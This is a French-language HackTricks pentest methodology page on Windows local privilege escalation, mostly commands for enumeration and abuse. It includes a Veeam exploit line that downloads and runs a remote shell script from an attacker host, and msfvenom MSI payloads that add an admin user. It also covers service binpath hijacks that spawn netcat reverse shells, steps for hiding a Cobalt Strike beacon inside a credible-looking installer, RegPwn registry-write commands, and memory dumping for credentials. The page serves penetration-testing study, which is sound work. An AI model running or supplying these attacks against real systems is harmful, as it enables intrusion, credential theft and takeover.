# Escalade locale de privilèges sous Windows

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher des vecteurs d'escalade de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale sur Windows

### Jetons d'accès

**Si vous ne savez pas ce que sont les jetons d'accès Windows, lisez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d'informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveaux d'intégrité

**Si vous ne connaissez pas les niveaux d'intégrité sous Windows, vous devriez lire la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Contrôles de sécurité Windows

Il existe différentes choses sous Windows qui peuvent **vous empêcher d'énumérer le système**, d'exécuter des exécutables ou même **de détecter vos activités**. Vous devriez **lire** la **page** suivante et **énumérer** tous ces **mécanismes** de **défense** avant de commencer l'énumération pour l'escalade de privilèges :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess élévation silencieuse

Les processus UIAccess lancés via `RAiLaunchAdminProcess` peuvent être abusés pour atteindre le High IL sans invites lorsque les vérifications secure-path d'AppInfo sont contournées. Consultez le workflow dédié de contournement UIAccess/Admin Protection ici :

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagation du registre d'accessibilité du Secure Desktop peut être abusée pour effectuer une écriture arbitraire dans le registre SYSTEM (RegPwn) :

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Informations système

### Énumération des informations de version

Vérifiez si la version de Windows présente des vulnérabilités connues (vérifiez aussi les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits par version

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, montrant la **vaste surface d'attaque** qu'un environnement Windows présente.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localement avec les informations système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environnement

Y a-t-il des credentials ou des infos Juicy enregistrés dans les variables d'environnement ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historique de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers de transcription PowerShell

Vous pouvez apprendre comment l'activer sur [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Les détails des exécutions de pipeline PowerShell sont enregistrés, couvrant les commandes exécutées, les invocations de commandes et des parties de scripts. Cependant, les détails d'exécution complets et les résultats de sortie peuvent ne pas être capturés.

Pour activer cela, suivez les instructions dans la section "Transcript files" de la documentation, en optant pour **"Module Logging"** au lieu de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour afficher les 15 derniers événements des PowersShell logs, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Un enregistrement complet des activités et du contenu intégral de l'exécution du script est capturé, garantissant que chaque bloc de code est documenté au fur et à mesure de son exécution. Ce processus préserve une piste d'audit complète de chaque activité, utile pour l'analyse médico-légale et l'étude des comportements malveillants. En documentant toutes les activités au moment de l'exécution, cela permet d'obtenir des informations détaillées sur le processus.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements de journalisation pour le Script Block peuvent être consultés dans le Windows Event Viewer au chemin : **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\ Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lecteurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées via http**S** mais http.

Commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant la commande suivante dans cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou la commande suivante dans PowerShell :
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si vous recevez une réponse telle que l'une des suivantes :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

Alors, **c'est exploitable.** Si cette valeur de registre est égale à 0, l'entrée WSUS sera ignorée.

Pour exploiter cette vulnérabilité, vous pouvez utiliser des outils tels que : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ce sont des scripts d'exploit MiTM, weaponized, permettant d'injecter des mises à jour 'fausses' dans le trafic WSUS non-SSL.

Consultez la recherche ici :

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lisez le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Concrètement, voici la faille exploitée par ce bug :

> Si nous pouvons modifier notre proxy utilisateur local, et que Windows Updates utilise le proxy configuré dans les paramètres d’Internet Explorer, nous pouvons donc exécuter localement [PyWSUS](https://github.com/GoSecure/pywsus) pour intercepter notre propre trafic et exécuter du code en tant qu'utilisateur élevé sur notre poste.
>
> De plus, puisque le service WSUS utilise les paramètres de l'utilisateur courant, il utilisera également son magasin de certificats. Si nous générons un certificat auto-signé pour le nom d'hôte WSUS et ajoutons ce certificat dans le magasin de certificats de l'utilisateur courant, nous serons capables d'intercepter le trafic WSUS HTTP et HTTPS. WSUS n'utilise pas de mécanismes de type HSTS pour implémenter une validation de type trust-on-first-use sur le certificat. Si le certificat présenté est approuvé par l'utilisateur et possède le nom d'hôte correct, il sera accepté par le service.

Vous pouvez exploiter cette vulnérabilité en utilisant l'outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu'il est libéré).

## Auto-updaters tiers et IPC des agents (local privesc)

De nombreux agents d'entreprise exposent une surface IPC localhost et un canal de mise à jour privilégié. Si l'enrôlement peut être contraint vers un serveur de l'attaquant et que l'updater fait confiance à une rogue root CA ou à des vérifications de signature faibles, un utilisateur local peut livrer un MSI malveillant que le service SYSTEM installera. Voir une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) ici :

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expose un service localhost sur **TCP/9401** qui traite des messages contrôlés par l'attaquant, permettant l'exécution de commandes arbitraires en tant que **NT AUTHORITY\SYSTEM**.

- **Recon**: confirmer l'écoute et la version, p. ex., `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: placer un PoC tel que `VeeamHax.exe` avec les DLLs Veeam requises dans le même répertoire, puis déclencher une payload SYSTEM via le socket local :
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Le service exécute la commande en tant que SYSTEM.
## KrbRelayUp

Une vulnérabilité d'**élévation de privilèges locale** existe dans les environnements Windows **domain** sous des conditions spécifiques. Ces conditions incluent des environnements où **LDAP signing is not enforced,** où les utilisateurs possèdent les droits leur permettant de configurer la **Resource-Based Constrained Delegation (RBCD),** et la capacité pour les utilisateurs de créer des ordinateurs dans le domaine. Il est important de noter que ces **exigences** sont remplies avec les **paramètres par défaut**.

Trouvez l'**exploit** sur [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Pour plus d'informations sur le déroulement de l'attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 clés de registre sont **activées** (valeur **0x1**), alors des utilisateurs de n'importe quel niveau de privilège peuvent **installer** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter, vous pouvez automatiser cette technique en utilisant le module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire courant un binaire Windows MSI pour escalader les privilèges. Ce script génère un installateur MSI précompilé qui demande l'ajout d'un user/group (donc vous aurez besoin d'un accès GIU) :
```
Write-UserAddMSI
```
Il suffit d'exécuter le binaire créé pour escalader les privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un MSI wrapper en utilisant ces outils. Notez que vous pouvez envelopper un fichier "**.bat**" si vous souhaitez **simplement** **exécuter** des **lignes de commande**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Générez** avec Cobalt Strike ou Metasploit un **nouveau Windows EXE TCP payload** dans `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et tapez "installer" dans la zone de recherche. Sélectionnez le projet **Setup Wizard** et cliquez **Next**.
- Donnez au projet un nom, par exemple **AlwaysPrivesc**, utilisez **`C:\privesc`** comme emplacement, sélectionnez **place solution and project in the same directory**, et cliquez **Create**.
- Cliquez sur **Next** jusqu'à arriver à l'étape 3 sur 4 (choose files to include). Cliquez **Add** et sélectionnez le Beacon payload que vous venez de générer. Puis cliquez **Finish**.
- Sélectionnez le projet **AlwaysPrivesc** dans le **Solution Explorer** et, dans les **Properties**, changez **TargetPlatform** de **x86** à **x64**.
- Il y a d'autres propriétés que vous pouvez modifier, comme **Author** et **Manufacturer**, ce qui peut rendre l'application installée plus crédible.
- Cliquez droit sur le projet et sélectionnez **View > Custom Actions**.
- Cliquez droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantira que le beacon payload est exécuté dès que l'installateur est lancé.
- Dans les **Custom Action Properties**, changez **Run64Bit** en **True**.
- Enfin, **build it**.
- Si l'avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` s'affiche, assurez-vous de définir la plateforme sur x64.

### MSI Installation

Pour exécuter l'**installation** du fichier `.msi` malveillant en **arrière-plan** :
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus et détecteurs

### Paramètres d'audit

Ces paramètres déterminent ce qui est **journalisé**, vous devez donc y prêter attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — il est intéressant de savoir où sont envoyés les logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** est conçu pour la **gestion des mots de passe Administrator locaux**, garantissant que chaque mot de passe est **unique, aléatoire et mis à jour régulièrement** sur les ordinateurs rattachés à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne peuvent être consultés que par des utilisateurs auxquels des permissions suffisantes ont été accordées via les ACLs, leur permettant de voir les mots de passe admin locaux si autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si activé, **les mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour la Local Security Authority (LSA) afin de **bloquer** les tentatives de processus non fiables visant à **lire sa mémoire** ou à injecter du code, renforçant ainsi la sécurité du système.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les identifiants stockés sur un appareil contre des menaces telles que les pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Les **identifiants de domaine** sont authentifiés par la **Local Security Authority** (LSA) et utilisés par les composants du système d'exploitation. Lorsque les données d'authentification d'un utilisateur sont validées par un package de sécurité enregistré, les identifiants de domaine de l'utilisateur sont généralement établis.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utilisateurs & Groupes

### Énumérer les utilisateurs & groupes

Vous devriez vérifier si l'un des groupes dont vous faites partie possède des permissions intéressantes.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **faites partie d'un groupe privilégié, vous pourriez être en mesure d'obtenir une élévation de privilèges**. Apprenez-en plus sur les groupes privilégiés et comment les abuser pour obtenir une élévation de privilèges ici :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**En savoir plus** sur ce qu'est un **token** sur cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **en apprendre davantage sur les tokens intéressants** et comment les abuser :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions
```bash
qwinsta
klist sessions
```
### Dossiers utilisateurs
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politique des mots de passe
```bash
net accounts
```
### Obtenir le contenu du presse-papiers
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours d'exécution

### Permissions des fichiers et dossiers

Tout d'abord, en listant les processus, vérifiez **la présence de mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture sur le dossier du binaire afin d'exploiter d'éventuelles [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Vérifiez toujours la présence de [**electron/cef/chromium debuggers** en cours d'exécution, vous pouvez en abuser pour obtenir une élévation de privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Vérification des permissions des binaires des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Vous pouvez créer un dump mémoire d'un processus en cours d'exécution en utilisant **procdump** de sysinternals. Des services comme FTP ont les **credentials en clair en mémoire**, essayez d'effectuer un dump de la mémoire et de lire les credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applications GUI non sécurisées

**Les applications s'exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD ou de parcourir des répertoires.**

Exemple : "Windows Help and Support" (Windows + F1), recherchez "command prompt", cliquez sur "Click to open Command Prompt"

## Services

Service Triggers permettent à Windows de démarrer un service lorsque certaines conditions se produisent (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Même sans les droits SERVICE_START, vous pouvez souvent démarrer des services privilégiés en déclenchant leurs triggers. Voir les techniques d'énumération et d'activation ici :

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenir la liste des services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Autorisations

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```bash
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilège requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si "Authenticated Users" peuvent modifier n'importe quel service :
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous rencontrez cette erreur (par exemple avec SSDPSRV) :

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Vous pouvez l'activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Prenez en compte que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement** à ce problème est d'exécuter :
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin du binaire du service**

Dans le scénario où le groupe "Authenticated users" possède **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier le binaire exécutable du service. Pour modifier et exécuter **sc** :
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrer le service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Les privilèges peuvent être escaladés via différentes permissions :

- **SERVICE_CHANGE_CONFIG**: Permet la reconfiguration du binaire du service.
- **WRITE_DAC**: Permet la reconfiguration des permissions, conduisant à la possibilité de modifier les configurations du service.
- **WRITE_OWNER**: Permet l'acquisition de la propriété et la reconfiguration des permissions.
- **GENERIC_WRITE**: Hérite de la capacité à modifier les configurations du service.
- **GENERIC_ALL**: Hérite également de la capacité à modifier les configurations du service.

Pour la détection et l'exploitation de cette vulnérabilité, on peut utiliser _exploit/windows/local/service_permissions_.

### Permissions faibles des binaires de services

**Vérifiez si vous pouvez modifier le binaire qui est exécuté par un service** ou si vous avez **des permissions d'écriture sur le dossier** où le binaire est situé ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez obtenir tous les binaires qui sont exécutés par un service en utilisant **wmic** (pas dans system32) et vérifier vos permissions en utilisant **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez également utiliser **sc** et **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Autorisations de modification du registre des services

Vous devriez vérifier si vous pouvez modifier un registre de service.\
Vous pouvez **vérifier** vos **autorisations** sur un **registre de service** en faisant :
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Il faut vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possèdent les permissions `FullControl`. Si c'est le cas, le binaire exécuté par le service peut être modifié.

Pour changer le Path du binaire exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race de symlink du registre vers écriture arbitraire de valeur HKLM (ATConfig)

Certaines fonctionnalités d'accessibilité Windows créent des clés par utilisateur **ATConfig** qui sont ensuite copiées par un processus **SYSTEM** dans une clé de session HKLM. Une **symbolic link race** du registre peut rediriger cette écriture privilégiée vers **n'importe quel chemin HKLM**, fournissant un primitive d'**écriture de valeur** HKLM arbitraire.

Emplacements clés (exemple : On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liste les fonctionnalités d'accessibilité installées.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stocke la configuration contrôlée par l'utilisateur.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` est créée pendant les transitions de logon/secure-desktop et est modifiable par l'utilisateur.

Enchaînement d'abus (CVE-2026-24291 / ATConfig):

1. Remplissez la valeur **HKCU ATConfig** que vous voulez voir écrite par SYSTEM.
2. Déclenchez la copie vers le secure-desktop (p. ex., **LockWorkstation**), ce qui démarre le flux du broker AT.
3. Gagnez la course en plaçant un **oplock** sur `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` ; lorsque l'oplock se déclenche, remplacez la clé **HKLM Session ATConfig** par un **registry link** pointant vers la cible protégée HKLM.
4. SYSTEM écrit la valeur choisie par l'attaquant dans le chemin HKLM redirigé.

Une fois que vous disposez d'une écriture de valeur HKLM arbitraire, pivotez vers LPE en écrasant les valeurs de configuration des services :

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Choisissez un service qu'un utilisateur normal peut démarrer (p. ex., **`msiserver`**) et déclenchez-le après l'écriture. **Remarque :** l'implémentation publique de l'exploit verrouille la station de travail dans le cadre de la course.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Registre des services AppendData/AddSubdirectory permissions

Si vous avez cette permission sur une clé de registre, cela signifie que **vous pouvez créer des sous-clés de registre à partir de celle-ci**. Dans le cas des services Windows, cela suffit **pour exécuter du code arbitraire :**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Chemins de service non entre guillemets

Si le chemin vers un exécutable n'est pas entre guillemets, Windows tentera d'exécuter chaque portion se terminant avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_ Windows tentera d'exécuter:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Listez tous les chemins de service non entourés de guillemets, à l'exclusion de ceux appartenant aux services Windows intégrés :
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
